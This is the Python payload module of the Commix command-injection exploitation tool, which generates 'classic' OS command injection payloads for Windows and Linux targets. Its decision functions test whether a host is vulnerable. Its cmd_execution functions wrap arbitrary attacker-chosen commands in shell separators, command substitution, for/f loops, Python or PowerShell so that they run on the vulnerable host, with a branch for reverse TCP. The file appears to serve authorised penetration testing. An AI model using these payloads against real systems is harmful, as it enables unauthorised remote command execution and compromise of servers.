#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG + TAG + TAG + settings.CMD_NUL
                )
    else:
        payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c \"" +
              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
              )
  else:
    if settings.USE_BACKTICKS or settings.WAF_ENABLED:
      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " %2B " + str(randv2) + settings.CMD_SUB_SUFFIX
    else:
      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "%2B" + str(randv2) + "))"

    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                )
    else:
      payload = (separator +
                "echo " + TAG +
                math_calc +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.SKIP_CALC:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""

    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c " +
              python_payload +
              "') do @set /p=%i " + settings.CMD_NUL
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                TAG +
                TAG + "')\""
                )
    else:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
                TAG + "'%2B'" +
                TAG + "')\""
                )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + 
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX 
    payload = (separator +
              "echo " + TAG +
              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
              cmd_exec +
              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
              )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + 
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('" +
                settings.WIN_PYTHON_INTERPRETER + 
                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                "') do @set /p=%i " + settings.CMD_NUL
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    payload = (separator +
              settings.LINUX_PYTHON_INTERPRETER + 
              " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
              TAG + "'%2B'" + TAG + "')\""
              )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

# eof
